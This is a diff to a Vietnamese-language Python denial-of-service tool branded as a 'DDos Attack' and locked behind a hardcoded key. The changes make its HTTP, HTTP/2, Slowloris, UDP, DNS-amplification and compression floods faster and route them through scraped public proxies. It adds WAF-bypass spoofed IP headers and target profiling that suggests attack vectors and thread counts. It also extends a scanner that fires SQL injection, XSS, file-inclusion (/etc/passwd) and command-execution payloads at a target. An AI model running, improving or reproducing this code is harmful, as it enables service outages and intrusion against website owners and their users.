@@ -32,9 +32,10 @@ import ssl
 import base64
 import zlib
 import re
-from typing import Dict, List
+from typing import Dict, List, Tuple
 import aiohttp_socks
 from fake_useragent import UserAgent
+import string
 
 # Khởi tạo console với theme màu
 custom_theme = Theme({
@@ -44,17 +45,18 @@ custom_theme = Theme({
     "success": "bold green",
     "highlight": "bold magenta",
     "vip": "bold blue",
+    "ultimate": "bold purple",
 })
 console = Console(theme=custom_theme)
 
 # Dấu nhắc kiểu hacker
-def hacker_prompt(message, default=None):
+def hacker_prompt(message: str, default: str = None) -> str:
     prompt_text = f"[bold magenta]┌──(quangbao㉿attack)-[~]\n└─$[/] [bold cyan]{message}[/]"
     return Prompt.ask(prompt_text, default=default)
 
 # Kiểm tra khóa xác thực
 def check_auth_key():
-    console.print("[info]CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI [bold magenta]BÌNH NGUYÊN VÔ TẬN...[/] [success][⚡][/]")
+    console.print("[info]CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI [bold magenta]BÌNH NGUYÊN VÔ TẬN V11...[/] [success][⚡][/]")
     key = hacker_prompt("Nhập key xác thực: ")
     if key != "baoddos":
         console.print("[error]LỖI: Key không đúng! Thoát chương trình. [error][✗][/]")
@@ -84,7 +86,7 @@ def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 # Hiệu ứng tải
-def loading_animation(message, duration):
+def loading_animation(message: str, duration: float):
     with Progress(
         SpinnerColumn(),
         TextColumn("[progress.description]{task.description}"),
@@ -92,50 +94,65 @@ def loading_animation(message, duration):
         console=console
     ) as progress:
         task = progress.add_task(f"[info]{message}[/]", total=100)
-        for i in range(0, 101, 25):
-            progress.update(task, advance=25, description=f"[info]{message} [{i}%]...[/]")
-            time.sleep(duration / 4)
+        for i in range(0, 101, 20):
+            progress.update(task, advance=20, description=f"[info]{message} [{i}%]...[/]")
+            time.sleep(duration / 5)
         progress.update(task, description=f"[success]{message} [100%]! [✓][/]")
 
-# Danh sách User-Agent (sử dụng fake_useragent)
+# User-Agent ngẫu nhiên
 ua = UserAgent()
 def generate_random_headers() -> Dict[str, str]:
     return {
         'User-Agent': ua.random,
-        'Accept': random.choice(['text/html', 'application/json', '*/*']),
-        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9']),
-        'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
+        'Accept': random.choice(['text/html', 'application/json', '*/*', 'application/xml']),
+        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
+        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'zstd']),
         'Connection': 'keep-alive',
         'Cache-Control': random.choice(['no-cache', 'max-age=0']),
-        'Referer': random.choice(['https://google.com', 'https://bing.com']),
+        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
         'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'X-Requested-With': 'XMLHttpRequest',
         'Pragma': 'no-cache',
+        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
     }
 
 # API Proxy từ dịch vụ bên thứ ba
-async def fetch_proxies_from_api(api_url: str = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http") -> List[Dict[str, str]]:
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=10) as response:
-                proxy_list = await response.text()
-                proxies = [
-                    {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-                    for proxy in proxy_list.splitlines() if proxy
-                ]
-                console.print(f"[success]API PROXY: Tải thành công [bold green]{len(proxies)}[/] proxy từ API. [success][✓][/]")
-                return proxies
-    except Exception as e:
-        console.print(f"[error]API PROXY: Lỗi khi tải proxy: [bold red]{str(e)}[/] [error][✗][/]")
-        return []
+async def fetch_proxies_from_api(api_urls: List[str] = [
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
+    "https://api.getproxylist.com/proxy",
+    "https://www.proxy-list.download/api/v1/get?type=http"
+]) -> List[Dict[str, str]]:
+    proxies = []
+    async with aiohttp.ClientSession() as session:
+        for api_url in api_urls:
+            try:
+                async with session.get(api_url, timeout=10) as response:
+                    if 'proxyscrape' in api_url:
+                        proxy_list = await response.text()
+                        proxies.extend([
+                            {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                            for proxy in proxy_list.splitlines() if proxy
+                        ])
+                    else:
+                        data = await response.json()
+                        proxies.extend([
+                            {"http": f"http://{data['ip']}:{data['port']}", "https": f"http://{data['ip']}:{data['port']}"}
+                            for data in (data if isinstance(data, list) else [data])
+                        ])
+                console.print(f"[success]API PROXY: Tải thành công [bold green]{len(proxies)}[/] proxy từ {api_url}. [success][✓][/]")
+            except Exception as e:
+                console.print(f"[error]API PROXY: Lỗi khi tải proxy từ {api_url}: [bold red]{str(e)}[/] [error][✗][/]")
+    return proxies
 
-# Danh sách proxy toàn cục
+# Khởi tạo proxy pool
 PROXY_LIST = []
 async def init_proxy_pool():
     global PROXY_LIST
     PROXY_LIST = await fetch_proxies_from_api()
     if not PROXY_LIST:
         console.print("[warning]HỆ THỐNG: Không có proxy, sử dụng kết nối trực tiếp. [warning][⚠][/]")
+    else:
+        console.print(f"[success]HỆ THỐNG: Khởi tạo [bold green]{len(PROXY_LIST)}[/] proxy thành công! [success][✓][/]")
 
 def get_random_proxy() -> Dict[str, str]:
     return random.choice(PROXY_LIST) if PROXY_LIST else None
@@ -149,7 +166,7 @@ response_times = []
 # Xác thực URL
 def validate_url(url: str) -> str:
     if not url.startswith(('http://', 'https://')):
-        url = 'http://' + url
+        url = 'https://' + url
     try:
         result = urllib.parse.urlparse(url)
         if not result.scheme or not result.netloc:
@@ -158,44 +175,71 @@ def validate_url(url: str) -> str:
     except Exception as e:
         raise ValueError(f"URL không hợp lệ: [bold red]{e}[/]")
 
-# Đánh giá mức độ bảo mật mục tiêu (nâng cấp)
-def assess_target_security(url: str) -> tuple:
-    security_level = "TRUNG BÌNH"
-    recommended_threads = 1000
-    recommended_requests = 1000
+# Phân tích mục tiêu nâng cao
+async def analyze_target(url: str) -> Dict:
+    analysis = {
+        "security_level": "TRUNG BÌNH",
+        "recommended_threads": 1000,
+        "recommended_requests": 1000,
+        "waf_detected": [],
+        "cdn_detected": None,
+        "ssl_info": {},
+        "subdomains": [],
+        "endpoints": [],
+        "server_info": {},
+        "attack_vectors": []
+    }
     try:
-        response = requests.head(url, headers=generate_random_headers(), timeout=5)
-        headers = response.headers
-        waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'f5', 'imperva']
-        server = headers.get('Server', '').lower()
-        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
-        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)
-        domain = urllib.parse.urlparse(url).hostname
-        whois_info = whois.whois(domain)
-        creation_date = whois_info.get('creation_date')
-        domain_age = (datetime.now() - creation_date[0]).days if isinstance(creation_date, list) and creation_date else 0
+        async with aiohttp.ClientSession() as session:
+            headers = generate_random_headers()
+            async with session.head(url, headers=headers, timeout=5, allow_redirects=True) as response:
+                headers = response.headers
+                waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'f5', 'imperva', 'aws waf']
+                server = headers.get('Server', '').lower()
+                analysis["waf_detected"] = [waf for waf in waf_indicators if waf in server or waf in headers.get('X-Powered-By', '').lower()]
+                analysis["cdn_detected"] = 'cloudflare' if 'cf-ray' in headers else None
+                analysis["server_info"] = {
+                    "server": server,
+                    "rate_limit": 'X-RateLimit-Limit' in headers or response.status in (429, 403),
+                    "status": response.status
+                }
+                domain = urllib.parse.urlparse(url).hostname
+                whois_info = whois.whois(domain)
+                creation_date = whois_info.get('creation_date')
+                domain_age = (datetime.now() - creation_date[0]).days if isinstance(creation_date, list) and creation_date else 0
+                analysis["domain_age"] = domain_age
 
-        # Kiểm tra SSL/TLS
-        ssl_info = check_ssl_security(domain)
-        ssl_level = ssl_info.get("security_level", "LOW")
+                # Phân tích SSL
+                analysis["ssl_info"] = check_ssl_security(domain)
 
-        if cdn_waf_detected or rate_limit or ssl_level == "HIGH":
-            security_level = "CAO"
-            recommended_threads = 10000
-            recommended_requests = 5000
-        elif domain_age > 365 or ssl_level == "MEDIUM":
-            security_level = "TRUNG BÌNH"
-            recommended_threads = 5000
-            recommended_requests = 2000
-        else:
-            security_level = "THẤP"
-            recommended_threads = 1000
-            recommended_requests = 1000
+                # Quét subdomain
+                analysis["subdomains"] = await subdomain_scan(domain)
 
-        console.print(f"[info]HỆ THỐNG: Đánh giá bảo mật: [bold magenta]{security_level}[/], SSL: [bold cyan]{ssl_level}[/], Luồng: [bold cyan]{recommended_threads:,}[/], Yêu cầu: [bold cyan]{recommended_requests:,}[/] [success][✓][/]")
+                # Phân tích cấu trúc web
+                web_structure = await web_structure_analysis(url)
+                analysis["endpoints"] = web_structure["endpoints"]
+
+                # Đề xuất chiến lược tấn công
+                if analysis["waf_detected"] or analysis["ssl_info"]["security_level"] == "HIGH" or analysis["server_info"]["rate_limit"]:
+                    analysis["security_level"] = "CAO"
+                    analysis["recommended_threads"] = 20000
+                    analysis["recommended_requests"] = 10000
+                    analysis["attack_vectors"] = ["HTTP/2 FLOOD", "WAF BYPASS", "API ENDPOINT ATTACK", "SYN FLOOD"]
+                elif domain_age > 365 or analysis["ssl_info"]["security_level"] == "MEDIUM":
+                    analysis["security_level"] = "TRUNG BÌNH"
+                    analysis["recommended_threads"] = 10000
+                    analysis["recommended_requests"] = 5000
+                    analysis["attack_vectors"] = ["CLOG ATTACK", "L7 ATTACK", "COMPRESSION ATTACK"]
+                else:
+                    analysis["security_level"] = "THẤP"
+                    analysis["recommended_threads"] = 5000
+                    analysis["recommended_requests"] = 2000
+                    analysis["attack_vectors"] = ["CLOG ATTACK", "SLOWLORIS", "UDP FLOOD"]
+
+                console.print(f"[info]PHÂN TÍCH MỤC TIÊU: [bold magenta]{analysis['security_level']}[/], WAF: [bold cyan]{', '.join(analysis['waf_detected']) or 'Không phát hiện'}[/], CDN: [bold cyan]{analysis['cdn_detected'] or 'Không phát hiện'}[/], SSL: [bold cyan]{analysis['ssl_info']['security_level']}[/], Luồng đề xuất: [bold green]{analysis['recommended_threads']:,}[/], Yêu cầu: [bold green]{analysis['recommended_requests']:,}[/] [success][✓][/]")
     except Exception as e:
-        console.print(f"[warning]HỆ THỐNG: Không thể đánh giá bảo mật: [bold yellow]{str(e)}[/]. Sử dụng giá trị mặc định. [warning][⚠][/]")
-    return security_level, recommended_threads, recommended_requests
+        console.print(f"[warning]PHÂN TÍCH: Lỗi phân tích mục tiêu: [bold yellow]{str(e)}[/]. Sử dụng giá trị mặc định. [warning][⚠][/]")
+    return analysis
 
 # Kiểm tra bảo mật SSL/TLS
 def check_ssl_security(hostname: str) -> Dict:
@@ -218,25 +262,66 @@ def check_ssl_security(hostname: str) -> Dict:
                 }
     except Exception as e:
         console.print(f"[warning]SSL SCAN: Lỗi kiểm tra SSL: [bold yellow]{str(e)}[/] [warning][⚠][/]")
-        return {"security_level": "LOW"}
+        return {"security_level": "LOW", "cipher": "N/A", "bits": 0, "protocol": "N/A"}
 
 # Điều chỉnh luồng theo khả năng thiết bị
-def adjust_threads_for_device(num_threads: int, num_requests: int) -> tuple:
-    cpu_count = multiprocessing.cpu_count()
-    mem_info = psutil.virtual_memory() if 'psutil' in globals() else type('obj', (), {'total': 8*1024*1024*1024})()
-    max_threads = min(num_threads, cpu_count * 1000, int(mem_info.total / (1024 * 1024)))  # Giới hạn theo CPU và RAM
-    max_requests = min(num_requests, 9999999)
-    console.print(f"[info]HỆ THỐNG: Điều chỉnh: [bold cyan]{max_threads:,}[/] luồng, [bold cyan]{max_requests:,}[/] yêu cầu dựa trên [bold magenta]{cpu_count}[/] CPU và [bold magenta]{mem_info.total/1024/1024:.0f}[/]MB RAM. [success][✓][/]")
+def adjust_threads_for_device(num_threads: int, num_requests: int) -> Tuple[int, int]:
+    try:
+        import psutil
+        cpu_count = psutil.cpu_count()
+        mem_info = psutil.virtual_memory()
+        max_threads = min(num_threads, cpu_count * 2000, int(mem_info.total / (512 * 1024)))  # Tăng giới hạn luồng
+        max_requests = min(num_requests, 99999999)  # Tăng giới hạn yêu cầu
+        console.print(f"[info]HỆ THỐNG: Điều chỉnh: [bold cyan]{max_threads:,}[/] luồng, [bold cyan]{max_requests:,}[/] yêu cầu dựa trên [bold magenta]{cpu_count}[/] CPU và [bold magenta]{mem_info.total/1024/1024:.0f}[/]MB RAM. [success][✓][/]")
+    except ImportError:
+        cpu_count = multiprocessing.cpu_count()
+        max_threads = min(num_threads, cpu_count * 2000)
+        max_requests = min(num_requests, 99999999)
+        console.print(f"[warning]HỆ THỐNG: Mô-đun psutil không được cài đặt. Điều chỉnh: [bold cyan]{max_threads:,}[/] luồng, [bold cyan]{max_requests:,}[/] yêu cầu dựa trên [bold magenta]{cpu_count}[/] CPU. [warning][⚠][/]")
     return max_threads, max_requests
 
-# VIP Feature 1: Tấn công HTTP/2 Flood
+# Tấn công clog (hàm gốc)
+def clog_attack(url: str, requests_per_thread: int, duration: float):
+    global success_count, error_count, response_times
+    session = requests.Session()
+    start_time = time.time()
+    max_retries = 5
+    while time.time() - start_time < duration:
+        retries = 0
+        while retries < max_retries:
+            try:
+                headers = generate_random_headers()
+                proxy = get_random_proxy()
+                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+                console.print(f"[error]CLOG ATTACK: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack")
+                with manager:
+                    success_count += 1
+                    response_times.append((time.time() - start_time) * 1000)
+                break
+            except requests.exceptions.ReadTimeout as e:
+                retries += 1
+                if retries == max_retries:
+                    with manager:
+                        error_count += 1
+                    console.print(f"[error]CLOG ATTACK: Thất bại sau {max_retries} lần thử: [bold red]{str(e)}[/] [error][✗][/]")
+                else:
+                    console.print(f"[warning]CLOG ATTACK: Timeout, thử lại lần {retries + 1}... [warning][⚠][/]")
+                    time.sleep(0.05)
+            except Exception as e:
+                with manager:
+                    error_count += 1
+                console.print(f"[error]CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
+                break
+        time.sleep(random.uniform(0.00001, 0.00005))  # Tăng tốc độ tấn công
+
+# Tấn công HTTP/2 Flood
 async def http2_flood_attack(url: str, requests_per_thread: int, duration: float):
     global success_count, error_count, response_times
     try:
         async with aiohttp.ClientSession(
             connector=aiohttp.TCPConnector(ssl=False, force_close=True),
             headers=generate_random_headers(),
-            timeout=aiohttp.ClientTimeout(total=3)
+            timeout=aiohttp.ClientTimeout(total=2)
         ) as session:
             start_time = time.time()
             while time.time() - start_time < duration:
@@ -250,11 +335,11 @@ async def http2_flood_attack(url: str, requests_per_thread: int, duration: float
                     with manager:
                         error_count += 1
                     console.print(f"[error]HTTP/2 FLOOD: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-                await asyncio.sleep(random.uniform(0.00005, 0.0001))
+                await asyncio.sleep(random.uniform(0.00001, 0.00005))
     except Exception as e:
         console.print(f"[error]HTTP/2 FLOOD: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")
 
-# VIP Feature 2: Tấn công Slowloris
+# Tấn công Slowloris
 def slowloris_attack(url: str, duration: float):
     global success_count, error_count, response_times
     try:
@@ -266,12 +351,12 @@ def slowloris_attack(url: str, duration: float):
         while time.time() - start_time < duration:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
+                s.settimeout(2)
                 s.connect((host, port))
-                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
+                s.send(f"GET /?{random.randint(1000,999999)} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
                 sockets.append(s)
                 console.print(f"[vip]SLOWLORIS: Kết nối mở: [bold green]{len(sockets)}[/] [success][✓][/]")
-                time.sleep(random.uniform(0.1, 0.5))
+                time.sleep(random.uniform(0.05, 0.2))
             except Exception as e:
                 with manager:
                     error_count += 1
@@ -281,11 +366,11 @@ def slowloris_attack(url: str, duration: float):
     except Exception as e:
         console.print(f"[error]SLOWLORIS: Lỗi: [bold red]{str(e)}[/] [error][✗][/]")
 
-# VIP Feature 3: Tấn công DNS Amplification
+# Tấn công DNS Amplification
 def dns_amplification_attack(target_ip: str, duration: float):
     global success_count, error_count
     resolver = dns.resolver.Resolver()
-    open_resolvers = ['8.8.8.8', '1.1.1.1']
+    open_resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -300,19 +385,19 @@ def dns_amplification_attack(target_ip: str, duration: float):
             with manager:
                 error_count += 1
             console.print(f"[error]DNS AMP: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-        time.sleep(0.1)
+        time.sleep(0.05)
 
-# VIP Feature 4: Tấn công Payload Compression
+# Tấn công Payload Compression
 def compression_attack(url: str, requests_per_thread: int, duration: float):
     global success_count, error_count, response_times
     session = requests.Session()
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            large_payload = zlib.compress(b'A' * 1000000)  # Payload lớn nén lại
+            large_payload = zlib.compress(('A' * 2000000).encode())  # Payload lớn hơn
             headers = generate_random_headers()
             headers['Content-Encoding'] = 'deflate'
-            response = session.post(url, data=large_payload, headers=headers, proxies=get_random_proxy(), timeout=3)
+            response = session.post(url, data=large_payload, headers=headers, proxies=get_random_proxy(), timeout=2)
             console.print(f"[vip]COMPRESSION: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/]")
             with manager:
                 success_count += 1
@@ -321,9 +406,9 @@ def compression_attack(url: str, requests_per_thread: int, duration: float):
             with manager:
                 error_count += 1
             console.print(f"[error]COMPRESSION: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-        time.sleep(random.uniform(0.00005, 0.0001))
+        time.sleep(random.uniform(0.00001, 0.00005))
 
-# VIP Feature 5: Tấn công Application Layer (L7)
+# Tấn công Application Layer (L7)
 async def application_layer_attack(url: str, requests_per_thread: int, duration: float):
     global success_count, error_count, response_times
     try:
@@ -331,7 +416,8 @@ async def application_layer_attack(url: str, requests_per_thread: int, duration:
             start_time = time.time()
             while time.time() - start_time < duration:
                 try:
-                    async with session.get(url + '?' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=50)), proxy=get_random_proxy()) as response:
+                    query = ''.join(random.choices(string.ascii_lowercase + string.digits, k=100))
+                    async with session.get(url + '?' + query, proxy=get_random_proxy()) as response:
                         console.print(f"[vip]L7 ATTACK: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/]")
                         with manager:
                             success_count += 1
@@ -340,21 +426,22 @@ async def application_layer_attack(url: str, requests_per_thread: int, duration:
                     with manager:
                         error_count += 1
                     console.print(f"[error]L7 ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-                await asyncio.sleep(random.uniform(0.00005, 0.0001))
+                await asyncio.sleep(random.uniform(0.00001, 0.00005))
     except Exception as e:
         console.print(f"[error]L7 ATTACK: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")
 
-# VIP Feature 6: Bypassing WAF
+# Tấn công WAF Bypass
 def waf_bypass_attack(url: str, requests_per_thread: int, duration: float):
     global success_count, error_count, response_times
     session = requests.Session()
     bypass_headers = generate_random_headers()
     bypass_headers['X-Originating-IP'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
     bypass_headers['CF-Connecting-IP'] = bypass_headers['X-Originating-IP']
+    bypass_headers['X-Real-IP'] = bypass_headers['X-Originating-IP']
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            response = session.get(url, headers=bypass_headers, proxies=get_random_proxy(), timeout=3)
+            response = session.get(url, headers=bypass_headers, proxies=get_random_proxy(), timeout=2)
             console.print(f"[vip]WAF BYPASS: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/]")
             with manager:
                 success_count += 1
@@ -363,17 +450,17 @@ def waf_bypass_attack(url: str, requests_per_thread: int, duration: float):
             with manager:
                 error_count += 1
             console.print(f"[error]WAF BYPASS: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-        time.sleep(random.uniform(0.00005, 0.0001))
+        time.sleep(random.uniform(0.00001, 0.00005))
 
-# VIP Feature 7: Tấn công API Endpoint
+# Tấn công API Endpoint
 async def api_endpoint_attack(url: str, duration: float):
     global success_count, error_count, response_times
     try:
         async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
             start_time = time.time()
+            endpoints = [url + path for path in ['/api/v1', '/api/v2', '/graphql', '/rest/api', '/v1', '/api/users']]
             while time.time() - start_time < duration:
                 try:
-                    endpoints = [url + '/api/v1', url + '/api/v2', url + '/graphql']
                     for endpoint in endpoints:
                         async with session.get(endpoint, proxy=get_random_proxy()) as response:
                             console.print(f"[vip]API ATTACK: Mã trạng thái: [bold green]{response.status}[/] cho [bold cyan]{endpoint}[/] [success][✓][/]")
@@ -384,18 +471,18 @@ async def api_endpoint_attack(url: str, duration: float):
                     with manager:
                         error_count += 1
                     console.print(f"[error]API ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-                await asyncio.sleep(random.uniform(0.00005, 0.0001))
+                await asyncio.sleep(random.uniform(0.00001, 0.00005))
     except Exception as e:
         console.print(f"[error]API ATTACK: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")
 
-# VIP Feature 8: Tấn công UDP Flood
+# Tấn công UDP Flood
 def udp_flood_attack(target_ip: str, port: int, duration: float):
     global success_count, error_count
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            payload = random._urandom(1024)
+            payload = random._urandom(2048)  # Tăng kích thước payload
             sock.sendto(payload, (target_ip, port))
             console.print(f"[vip]UDP FLOOD: Gửi payload đến [bold green]{target_ip}:{port}[/] [success][✓][/]")
             with manager:
@@ -404,28 +491,28 @@ def udp_flood_attack(target_ip: str, port: int, duration: float):
             with manager:
                 error_count += 1
             console.print(f"[error]UDP FLOOD: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-        time.sleep(0.01)
+        time.sleep(0.005)
     sock.close()
 
-# VIP Feature 9: Quét Subdomain
+# Quét Subdomain
 async def subdomain_scan(domain: str) -> List[str]:
     subdomains = []
-    common_subdomains = ['www', 'mail', 'ftp', 'api', 'dev', 'test', 'staging']
+    common_subdomains = ['www', 'mail', 'ftp', 'api', 'dev', 'test', 'staging', 'admin', 'login', 'blog']
     async with aiohttp.ClientSession() as session:
+        tasks = []
         for sub in common_subdomains:
-            try:
-                url = f"http://{sub}.{domain}"
-                async with session.head(url, timeout=5) as response:
-                    if response.status < 400:
-                        subdomains.append(url)
-                        console.print(f"[vip]SUBDOMAIN SCAN: Tìm thấy [bold green]{url}[/] [success][✓][/]")
-            except Exception:
-                pass
+            url = f"https://{sub}.{domain}"
+            tasks.append(session.head(url, timeout=5, allow_redirects=True))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for sub, result in zip(common_subdomains, results):
+            if not isinstance(result, Exception) and result.status < 400:
+                subdomains.append(f"https://{sub}.{domain}")
+                console.print(f"[vip]SUBDOMAIN SCAN: Tìm thấy [bold green]{sub}.{domain}[/] [success][✓][/]")
     return subdomains
 
-# VIP Feature 10: Phân tích cấu trúc web
+# Phân tích cấu trúc web
 async def web_structure_analysis(url: str) -> Dict:
-    structure = {"endpoints": [], "forms": [], "links": []}
+    structure = {"endpoints": [], "forms": [], "links": [], "apis": []}
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(url, headers=generate_random_headers(), timeout=10) as response:
@@ -433,96 +520,84 @@ async def web_structure_analysis(url: str) -> Dict:
                 structure["endpoints"] = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('/')]
                 structure["forms"] = [form.get('action') for form in soup.find_all('form') if form.get('action')]
                 structure["links"] = [link['href'] for link in soup.find_all('link', href=True)]
+                structure["apis"] = [script['src'] for script in soup.find_all('script', src=True) if 'api' in script['src'].lower()]
                 console.print(f"[vip]WEB ANALYSIS: Phân tích thành công [bold green]{url}[/] [success][✓][/]")
     except Exception as e:
         console.print(f"[error]WEB ANALYSIS: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
     return structure
-
-# Tấn công clog (hàm gốc)
-def clog_attack(url: str, requests_per_thread: int, duration: float):
-    global success_count, error_count, response_times
-    session = requests.Session()
-    start_time = time.time()
-    max_retries = 3
-    while time.time() - start_time < duration:
-        retries = 0
-        while retries < max_retries:
-            try:
-                headers = generate_random_headers()
-                proxy = get_random_proxy()
-                response = session.get(url, headers=headers, proxies=proxy, timeout=3)
-                console.print(f"[error]CLOG ATTACK: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack")
-                with manager:
-                    success_count += 1
-                    response_times.append((time.time() - start_time) * 1000)
-                break
-            except requests.exceptions.ReadTimeout as e:
-                retries += 1
-                if retries == max_retries:
-                    with manager:
-                        error_count += 1
-                    console.print(f"[error]CLOG ATTACK: Thất bại sau {max_retries} lần thử: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
-                else:
-                    console.print(f"[warning]CLOG ATTACK: Timeout, thử lại lần {retries + 1}... [warning][⚠][/] ©2025 Quang Bao - DDos Attack")
-                    time.sleep(0.1)
-            except Exception as e:
-                with manager:
-                    error_count += 1
-                console.print(f"[error]CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
-                break
-        time.sleep(random.uniform(0.00005, 0.0001))
 
 # Quét lỗ hổng web nâng cao
 async def scan_vulnerabilities(url: str) -> List[Dict]:
     vulnerabilities = []
     async with aiohttp.ClientSession() as session:
         try:
-            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL --"]
+            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL, NULL --", "1' OR '1'='1' --"]
             for payload in sql_payloads:
                 async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                     text = await response.text()
-                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database"]):
+                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database", "sqlite", "postgresql"]):
                         vulnerabilities.append({
                             "type": "SQL Injection",
-                            "severity": "High",
+                            "severity": "Critical",
                             "description": f"Potential SQL Injection with payload: [bold magenta]{payload}[/]",
-                            "recommendation": "Use prepared statements and input validation."
+                            "recommendation": "Use prepared statements and parameterized queries."
                         })
                         break
         except Exception as e:
             console.print(f"[warning]VULN SCAN: SQL Injection scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")
 
         try:
-            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>"]
+            xss_payloads = [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert('XSS')>",
+                "javascript:alert('XSS')"
+            ]
             for payload in xss_payloads:
                 async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                     text = await response.text()
-                    if payload in text:
+                    if payload in text or 'alert(' in text:
                         vulnerabilities.append({
                             "type": "Cross-Site Scripting (XSS)",
-                            "severity": "Medium",
+                            "severity": "High",
                             "description": f"Reflected XSS with payload: [bold magenta]{payload}[/]",
-                            "recommendation": "Encode all output and use Content Security Policy."
+                            "recommendation": "Encode all output, use Content Security Policy, and sanitize inputs."
                         })
                         break
         except Exception as e:
             console.print(f"[warning]VULN SCAN: XSS scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")
 
         try:
-            lfi_payloads = ["../../etc/passwd", "../config.php"]
+            lfi_payloads = ["../../etc/passwd", "../config.php", "/proc/self/environ"]
             for payload in lfi_payloads:
                 async with session.get(f"{url}?file={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                     text = await response.text()
-                    if "root:" in text or "php" in text.lower():
+                    if any(keyword in text.lower() for keyword in ["root:", "php", "password"]):
                         vulnerabilities.append({
                             "type": "Local File Inclusion (LFI)",
                             "severity": "Critical",
                             "description": f"Potential LFI with payload: [bold magenta]{payload}[/]",
-                            "recommendation": "Restrict file access and validate input paths."
+                            "recommendation": "Restrict file access, validate input paths, and disable dangerous functions."
                         })
                         break
         except Exception as e:
             console.print(f"[warning]VULN SCAN: LFI scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")
+
+        try:
+            rce_payloads = ["<?php phpinfo(); ?>", "system('whoami')", "exec('id')"]
+            for payload in rce_payloads:
+                async with session.get(f"{url}?cmd={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
+                    text = await response.text()
+                    if any(keyword in text.lower() for keyword in ["phpinfo", "uid=", "gid="]):
+                        vulnerabilities.append({
+                            "type": "Remote Code Execution (RCE)",
+                            "severity": "Critical",
+                            "description": f"Potential RCE with payload: [bold magenta]{payload}[/]",
+                            "recommendation": "Disable eval/exec functions, validate inputs, and use a WAF."
+                        })
+                        break
+        except Exception as e:
+            console.print(f"[warning]VULN SCAN: RCE scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")
 
     return vulnerabilities
 
@@ -540,10 +615,145 @@ def display_vulnerability_report(vulnerabilities: List[Dict]):
         console.print("[success]VULN SCAN: Không phát hiện lỗ hổng! [✓][/]")
